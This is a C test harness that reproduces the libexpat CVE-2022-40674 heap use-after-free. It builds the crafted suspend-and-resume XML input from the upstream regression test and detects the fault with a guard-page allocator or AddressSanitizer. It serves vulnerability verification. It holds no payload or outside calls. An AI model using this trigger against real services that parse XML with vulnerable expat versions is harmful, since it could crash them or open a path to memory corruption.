/*
 * CVE-2022-40674 — libexpat heap use-after-free in doContent
 *
 * Driver: reproduces the upstream regression test (tests/runtests.c,
 * commit a7ce80a0) against a real vulnerable release.
 *
 * Oracle: a guard-page allocator, because AddressSanitizer is not available
 * for this toolchain. Every allocation is placed so that it ends at a page
 * boundary followed by a PAGE_NOACCESS guard page, and every freed block is
 * itself switched to PAGE_NOACCESS and kept reserved (quarantine). A
 * use-after-free therefore raises an access violation at the exact
 * instruction that touches freed memory.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "expat.h"

#if defined(_WIN32)
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#define PAGE 4096
#define MAX_BLOCKS 8192

typedef struct {
  void *user;
  void *base;
  size_t total;
  size_t size;
} block_t;

static block_t blocks[MAX_BLOCKS];
static int nblocks = 0;

static block_t *find_block(void *user) {
  for (int i = 0; i < nblocks; i++)
    if (blocks[i].user == user)
      return &blocks[i];
  return NULL;
}

static void *guard_malloc(size_t n) {
  if (n == 0) n = 1;
  size_t pages = (n + PAGE - 1) / PAGE;
  size_t total = (pages + 1) * PAGE;
  unsigned char *base = (unsigned char *)VirtualAlloc(NULL, total,
                                                      MEM_RESERVE | MEM_COMMIT,
                                                      PAGE_READWRITE);
  if (!base) return NULL;
  unsigned char *guard = base + pages * PAGE;
  DWORD old;
  VirtualProtect(guard, PAGE, PAGE_NOACCESS, &old);

  /* block ends at the guard page; keep 16-byte alignment */
  unsigned char *user = (unsigned char *)((uintptr_t)(guard - n) & ~(uintptr_t)15);

  if (nblocks < MAX_BLOCKS) {
    blocks[nblocks].user = user;
    blocks[nblocks].base = base;
    blocks[nblocks].total = total;
    blocks[nblocks].size = n;
    nblocks++;
  }
  return user;
}

static void guard_free(void *p) {
  if (!p) return;
  block_t *b = find_block(p);
  if (!b) return;
  DWORD old;
  /* poison the whole data region: any later touch faults */
  VirtualProtect(b->base, b->total - PAGE, PAGE_NOACCESS, &old);
  /* keep the record so a second free is also detectable */
}

static void *guard_realloc(void *p, size_t n) {
  if (!p) return guard_malloc(n);
  block_t *b = find_block(p);
  if (!b) return guard_malloc(n);
  size_t old = b->size;
  void *q = guard_malloc(n);
  if (!q) return NULL;
  memcpy(q, p, old < n ? old : n);
  guard_free(p);
  return q;
}

static const XML_Memory_Handling_Suite suite = {guard_malloc, guard_realloc,
                                                guard_free};
#define PARSER_SUITE (&suite)
#else
/* On POSIX, build with -fsanitize=address and let the runtime own memory. */
#define PARSER_SUITE NULL
#endif

/* ---- the trigger, taken from the upstream regression test ---- */
static void XMLCALL on_comment(void *userData, const XML_Char *data) {
  (void)data;
  XML_StopParser((XML_Parser)userData, XML_TRUE);
}

int main(void) {
  /* <!DOCTYPE a [<!ENTITY e '<!--COMMENT-->a'>]><a>&e;<b>\n< + long name + /> */
  size_t prefix_len = strlen("<!DOCTYPE a [<!ENTITY e '<!--COMMENT-->a'>]><a>&e;<b>\n<");
  size_t name_len = 2050;
  size_t suffix_len = strlen("/></b></a>");
  size_t total = prefix_len + name_len + suffix_len + 1;

  char *text = (char *)malloc(total);
  if (!text) return 2;
  char *w = text;
  memcpy(w, "<!DOCTYPE a [<!ENTITY e '<!--COMMENT-->a'>]><a>&e;<b>\n<", prefix_len);
  w += prefix_len;
  memset(w, 'a', name_len);
  w += name_len;
  memcpy(w, "/></b></a>", suffix_len);
  w += suffix_len;
  *w = '\0';

  const size_t first_chunk = 54; /* same split as the upstream test */

  XML_Parser parser = XML_ParserCreate_MM(NULL, PARSER_SUITE, NULL);
  if (!parser) { fprintf(stderr, "parser create failed\n"); return 2; }
  XML_SetUserData(parser, parser);
  XML_SetCommentHandler(parser, on_comment);

  printf("input bytes: %zu, first chunk: %zu\n", (size_t)(w - text), first_chunk);
  fflush(stdout);

  enum XML_Status st = XML_Parse(parser, text, (int)first_chunk, XML_FALSE);
  printf("step 1 parse(first chunk) -> %s\n",
         st == XML_STATUS_SUSPENDED ? "SUSPENDED" : (st == XML_STATUS_OK ? "OK" : "ERROR"));
  fflush(stdout);
  if (st != XML_STATUS_SUSPENDED) {
    printf("RESULT: did not suspend; trigger not reached\n");
    return 3;
  }

  st = XML_ResumeParser(parser);
  printf("step 2 resume -> %s\n", st == XML_STATUS_OK ? "OK" : "ERROR");
  fflush(stdout);

  st = XML_Parse(parser, text + first_chunk, (int)((w - text) - first_chunk), XML_TRUE);
  printf("step 3 parse(rest) -> %s\n", st == XML_STATUS_OK ? "OK" : "ERROR");
  fflush(stdout);

  XML_ParserFree(parser);
  printf("RESULT: completed without fault (no use-after-free observed)\n");
  free(text);
  return st == XML_STATUS_OK ? 0 : 1;
}
